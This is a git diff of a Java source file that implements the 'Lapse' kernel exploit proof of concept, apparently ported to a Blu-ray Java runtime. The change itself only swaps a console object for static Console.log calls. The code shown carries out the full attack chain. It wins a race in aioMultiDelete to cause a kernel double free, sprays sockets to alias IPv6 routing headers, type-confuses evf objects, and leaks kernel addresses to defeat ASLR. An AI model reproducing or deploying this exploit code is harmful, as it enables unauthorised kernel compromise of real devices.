@@ -16,7 +16,7 @@ package org.bdj.lapse;
  * General Public License. See the LICENSE file in the repository root for details.
  */
 
-import org.bdj.UITextConsole;
+import org.bdj.Console;
 import org.bdj.api.API;
 import org.bdj.api.Buffer;
 import org.bdj.lapse.LibKernel.PthreadBarrier;
@@ -31,20 +31,18 @@ public class Lapse extends Thread {
 	public final LibKernel k;
 	public final API api;
 	public final LibC c;
-	public final UITextConsole console;
 
-	public Lapse(LibKernel libkernel, UITextConsole console) {
+	public Lapse(LibKernel libkernel) {
 		k = libkernel;
 		api = k.api;
 		c = k.libc;
-		this.console = console;
 	}
 
 	public void run() {
 		try {
 			exploit();
 		} catch (Throwable e) {
-			console.add(e);
+			Console.log(e);
 		} finally {
 			cleanup();
 		}
@@ -67,7 +65,7 @@ public class Lapse extends Thread {
 	AioSubmitIdArray ids = null; // should all be cancelled during cleanup
 
 	private void exploit() throws Throwable {
-		console.add("Lapse: setting things up");
+		Console.log("Lapse: setting things up");
 
 		// Pin so that we only use one per-CPU bucket. Makes heap spraying/grooming easier.
 		// initialCPUAffinity = k.cpuGetAffinityForCurrentThread();
@@ -95,8 +93,8 @@ public class Lapse extends Thread {
 				socketsAlt[i] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
 			}
 		} catch (SystemCallFailed e) {
-			console.add(e);
-			console.add("This usually means you have to close the application and try again.");
+			Console.log(e);
+			Console.log("This usually means you have to close the application and try again.");
 			return;
 		}
 
@@ -114,17 +112,17 @@ public class Lapse extends Thread {
 		boolean success = false;
 
 		for (int i = 0; i < NUM_DOUBLE_FREE_TRIES; i++) {
-			console.add("Lapse: double-free attempt " + i);
+			Console.log("Lapse: double-free attempt " + i);
 			// FIXME: abc's PoC does this (and the wait) inside the loop but that seems weird?
 			// lapse.lua/mjs does it outside the loop, try that and see if it still works
 			try {
 				// Issue requests and get back submission IDs to use later
 				// Command and priority do not matter but the MULTI flag is required
 				k.aioSubmitCmd(LibKernel.AIO_CMD_MULTI_WRITE, reqs, ids);
-				console.add("-> aioSubmitCmd MULTI_WRITE for " + reqs.count + " reqs => ids");
+				Console.log("-> aioSubmitCmd MULTI_WRITE for " + reqs.count + " reqs => ids");
 			} catch (SystemCallFailed e) {
-				console.add(e);
-				console.add("This usually means you have to close the application and try again.");
+				Console.log(e);
+				Console.log("This usually means you have to close the application and try again.");
 				return;
 			}
 
@@ -135,11 +133,11 @@ public class Lapse extends Thread {
 			// result can become out of date.
 			k.aioMultiWait(ids, null, LibKernel.AIO_WAIT_AND);
 
-			console.add("-> aioMultiWait for " + ids.count + " ids (0x" +
+			Console.log("-> aioMultiWait for " + ids.count + " ids (0x" +
 				Long.toHexString(ids.address()) + ") done");
 
 			RaceThread racer = new RaceThread(barrier, deleteIds, raceErr);
-			console.add("-> starting race thread");
+			Console.log("-> starting race thread");
 			racer.start();
 
 			// Sync point between threads
@@ -150,40 +148,40 @@ public class Lapse extends Thread {
 			// Double free on the 0x80 malloc zone. Important kernel data may alias.
 			k.aioMultiDelete(deleteIds, mainErr);
 
-			console.add("-> aioMultiDelete for " + deleteIds.count + " ids (0x" +
+			Console.log("-> aioMultiDelete for " + deleteIds.count + " ids (0x" +
 				Long.toHexString(deleteIds.address()) + ") done");
 
 			// Wait for race thread to finish
 			racer.join();
-			console.add("-> race thread finished");
+			Console.log("-> race thread finished");
 
 			// RESTORE: This code will reserve the double freed memory (see PANIC above).
 			// FIXME: Is this actually the case or am I totally misunderstanding?
 			aliasRthdrBufAddr = api.malloc(RTHDR_SIZE);
-			console.add("-> allocated aliased buffer at 0x" + Long.toHexString(aliasRthdrBufAddr));
+			Console.log("-> allocated aliased buffer at 0x" + Long.toHexString(aliasRthdrBufAddr));
 
 			// Read errors. The race is successful if they are both zero.
 			int m = mainErr.get(0).id.get();
 			int r = raceErr.get(0).id.get();
-			console.add("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
+			Console.log("-> errors: 0x" + Integer.toHexString(m) + " 0x" + Integer.toHexString(r));
 			if (m == 0 && r == 0) {
-				console.add("-> double free achieved!");
+				Console.log("-> double free achieved!");
 				success = true;
 				break;
 			}
 
-			console.add("-> attempt failed");
+			Console.log("-> attempt failed");
 		}
 
 		if (!success) {
-			console.add("Lapse: couldn't achieve double free in " + NUM_DOUBLE_FREE_TRIES + " tries");
+			Console.log("Lapse: couldn't achieve double free in " + NUM_DOUBLE_FREE_TRIES + " tries");
 			return;
 		}
 
 		// Continue with make_aliased_rthdrs from lapse.lua/mjs
 		// RESTORE: This will fill the double freed memory with harmless data (see PANIC above).
 
-		console.add("Lapse: make aliased rthdrs");
+		Console.log("Lapse: make aliased rthdrs");
 
 		Buffer aliasRthdrBuf = new Buffer(aliasRthdrBufAddr, RTHDR_SIZE);
 		aliasRthdrBuf.fill((byte)0); // should probably do this before anything else...
@@ -193,7 +191,7 @@ public class Lapse extends Thread {
 		int rthdrLen = (ip6rLen + 1) << 3; // rsize in lapse
 		Buffer aliasRthdrBufAdjLen = new Buffer(aliasRthdrBufAddr, rthdrLen);
 
-		console.add("-> RTHDR_SIZE " + RTHDR_SIZE + " ip6rLen " + ip6rLen + " rthdrLen " + rthdrLen);
+		Console.log("-> RTHDR_SIZE " + RTHDR_SIZE + " ip6rLen " + ip6rLen + " rthdrLen " + rthdrLen);
 
 		// IPV6_RTHDR (routing header?) options struct for setsockopt
 		aliasRthdrBuf.putByte(0, (byte)0);              // ip6r_nxt
@@ -207,22 +205,22 @@ public class Lapse extends Thread {
 		boolean aliasSocketPairFound = false;
 
 		for (int iTry = 0; iTry < NUM_RTHDR_ALIAS_TRIES; iTry++) {
-			console.add("Lapse: aliased socket pair attempt " + iTry);
+			Console.log("Lapse: aliased socket pair attempt " + iTry);
 			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
 				Socket socket = sockets[iSocket];
 				aliasRthdrBuf.putInt(markerOffset, iSocket + 1);
 				// Does setsockopt actually need to be called with rthdrLen?
-				console.add("-> socket " + socket.fd + " setsockopt IPV6_RTHDR");
+				Console.log("-> socket " + socket.fd + " setsockopt IPV6_RTHDR");
 				socket.setOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBufAdjLen);
 			}
 			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
 				Socket socket = sockets[iSocket];
 				// Why pass the full length here but not for setsockopt in 1st loop? Does it matter?
-				console.add("-> socket " + socket.fd + " getsockopt IPV6_RTHDR");
+				Console.log("-> socket " + socket.fd + " getsockopt IPV6_RTHDR");
 				socket.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, aliasRthdrBuf);
 				int marker = aliasRthdrBuf.getInt(markerOffset);
 				if (marker != iSocket) {
-					console.add("-> marker " + marker + " != isocket " + iSocket);
+					Console.log("-> marker " + marker + " != isocket " + iSocket);
 					// Save aliased socket pair
 					aliasSocketPair[0] = sockets[iSocket];
 					aliasSocketPair[1] = sockets[marker];
@@ -230,12 +228,12 @@ public class Lapse extends Thread {
 					sockets[iSocket] = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
 					sockets[marker]  = k.new Socket(LibKernel.AF_INET6, LibKernel.SOCK_DGRAM, LibKernel.IPPROTO_UDP);
 					int fd0 = aliasSocketPair[0].fd, fd1 = aliasSocketPair[1].fd;
-					console.add("-> aliased rthdr socket fds: " + fd0 + ", " + fd1);
+					Console.log("-> aliased rthdr socket fds: " + fd0 + ", " + fd1);
 					aliasSocketPairFound = true;
 					break;
 				}
 			}
-			console.add("-> clear other rthdrs");
+			Console.log("-> clear other rthdrs");
 			// Clear rthdrs for everything other than the aliased pair
 			for (int iSocket = 0; iSocket < NUM_SOCKETS; iSocket++) {
 				Socket socket = sockets[iSocket];
@@ -247,21 +245,21 @@ public class Lapse extends Thread {
 		}
 
 		if (!aliasSocketPairFound) {
-			console.add("Lapse: couldn't make aliased rthdrs in " + NUM_RTHDR_ALIAS_TRIES + " tries");
+			Console.log("Lapse: couldn't make aliased rthdrs in " + NUM_RTHDR_ALIAS_TRIES + " tries");
 			return;
 		}
 
 		// MEMLEAK: If we won the race, aio_obj.ao_num_reqs got decremented twice.
 		// So this call will leave the kernel-side struct for one request undeleted.
 		k.aioMultiDelete(ids, null);
-		console.add("-> aioMultiDelete " + ids.count + " ids (0x" +
+		Console.log("-> aioMultiDelete " + ids.count + " ids (0x" +
 			Long.toHexString(ids.address()) + ") done");
 
 		// *****************************************************************************************
 		// Step 2: Leak kernel addresses using the aliased socket pair
 		// *****************************************************************************************
 
-		console.add("Lapse: leaking kernel addresses");
+		Console.log("Lapse: leaking kernel addresses");
 
 		final int LEAK_LEN = 16;
 		Buffer leakBuf = new Buffer(RTHDR_SIZE * LEAK_LEN);
@@ -276,11 +274,11 @@ public class Lapse extends Thread {
 		//  int evf_delete(int id)
 
 		// The point of this step is to leak the contents of the rthdr I guess?
-		console.add("-> type-confuse struct evf with struct ip6_rthdr");
+		Console.log("-> type-confuse struct evf with struct ip6_rthdr");
 
 		// Free one rthdr
 		Socket sd = aliasSocketPair[0];
-		console.add("-> close socket fd " + aliasSocketPair[1].fd + " & keep fd " + sd.fd);
+		Console.log("-> close socket fd " + aliasSocketPair[1].fd + " & keep fd " + sd.fd);
 		aliasSocketPair[1].close();
 
 		final int NUM_LEAK_TRIES = 100;
@@ -290,8 +288,8 @@ public class Lapse extends Thread {
 
 		for (int iTry = 0; iTry < NUM_LEAK_TRIES; iTry++) {
 			// Reclaim freed rthdr with evf object
-			console.add("Lapse: rthdr/evf alias attempt " + iTry);
-			console.add("-> create new evfs with flags 0xf00 | (i << 16)");
+			Console.log("Lapse: rthdr/evf alias attempt " + iTry);
+			Console.log("-> create new evfs with flags 0xf00 | (i << 16)");
 			for (int iEvf = 0; iEvf < NUM_EVFS; iEvf++) {
 				// From lapse.mjs: flags must be set to >= 0xf00 to fully leak contents of rthdr
 				int flags = 0xf00 | (iEvf << 16);
@@ -299,7 +297,7 @@ public class Lapse extends Thread {
 			}
 
 			// In Lapse: get_rthdr(sd, buf, 0x80)
-			console.add("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
+			Console.log("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
 			sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
 
 			// Check required because sometimes we read values way out of bounds?
@@ -308,31 +306,31 @@ public class Lapse extends Thread {
 			if ((flags & 0xf00) == 0xf00) {
 				int idx = flags >> 16;
 				Evf evf = evfs[idx];
-				console.add("-> read flags 0x" + Integer.toHexString(flags) + " idx " + idx);
+				Console.log("-> read flags 0x" + Integer.toHexString(flags) + " idx " + idx);
 
 				// This set changes the rthdr length I guess?
 				int expectedFlags = flags | 1;
 				evf.set(expectedFlags);
-				console.add("-> set flags 0x" + Integer.toHexString(expectedFlags));
+				Console.log("-> set flags 0x" + Integer.toHexString(expectedFlags));
 
 				// In Lapse: get_rthdr(sd, buf, 0x80)
-				console.add("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
+				Console.log("-> socket " + sd.fd + " getsockopt IPV6_RTHDR");
 				sd.getOption(LibKernel.IPPROTO_IPV6, LibKernel.IPV6_RTHDR, leakBufRthdrSized);
 
 				// Check if we've done anything interesting
 				int newFlags = leakBuf.getInt(0);
 				if (newFlags == expectedFlags) {
-					console.add("-> type-confusion successful on attempt " + iTry);
+					Console.log("-> type-confusion successful on attempt " + iTry);
 					confusedEvf = evfs[idx];
 					evfs[idx] = null;
 				} else {
-					console.add("-> attempt failed, read flags 0x" + Integer.toHexString(newFlags));
+					Console.log("-> attempt failed, read flags 0x" + Integer.toHexString(newFlags));
 				}
 			} else {
-				console.add("-> attempt failed, read flags 0x" + Integer.toHexString(flags));
+				Console.log("-> attempt failed, read flags 0x" + Integer.toHexString(flags));
 			}
 
-			console.add("-> deleting other evfs");
+			Console.log("-> deleting other evfs");
 			for (int iEvf = 0; iEvf < NUM_EVFS; iEvf++) {
 				if (evfs[iEvf] != null) {
 					evfs[iEvf].delete();
@@ -343,13 +341,13 @@ public class Lapse extends Thread {
 		}
 
 		if (confusedEvf == null) {
-			console.add("Lapse: couldn't leak kernel addresses in " + NUM_LEAK_TRIES + " tries");
+			Console.log("Lapse: couldn't leak kernel addresses in " + NUM_LEAK_TRIES + " tries");
 			return;
 		}
 
 		// ip6_rthdr and evf obj are overlapped by now
 		// enlarge ip6_rthdr by writing to its len field by setting the evf's flag
-		console.add("-> enlarging ip6_rthdr");
+		Console.log("-> enlarging ip6_rthdr");
 		confusedEvf.set(0xff << 8);
 
 		// Structure of evf as documented by lapse.mjs:
@@ -360,16 +358,16 @@ public class Lapse extends Thread {
 		// Now we can get an address inside the kernel's mapped ELF file via evf.cv.cv_description
 		// I guess the point of all of this is to defeat ASLR?
 		long keEvfCvDescAddr = leakBuf.getLong(0x28);
-		console.add("-> leaked kernel address of 'evf cv': 0x" + Long.toHexString(keEvfCvDescAddr));
+		Console.log("-> leaked kernel address of 'evf cv': 0x" + Long.toHexString(keEvfCvDescAddr));
 
 		// From lapse.mjs: because of TAILQ_INIT(), we have:
 		//  evf.waiters.tqh_last == &evf.waiters.tqh_first
 		// We now know the address of the kernel buffer we are leaking
 
 		long keLeakBufAddr = leakBuf.getLong(0x40) - 0x38;
-		console.add("-> leaked kernel address of buffer: 0x" + Long.toHexString(keLeakBufAddr));
+		Console.log("-> leaked kernel address of buffer: 0x" + Long.toHexString(keLeakBufAddr));
 
-		console.add("Lapse: end of PoC");
+		Console.log("Lapse: end of PoC");
 	}
 
 	private class RaceThread extends Thread {
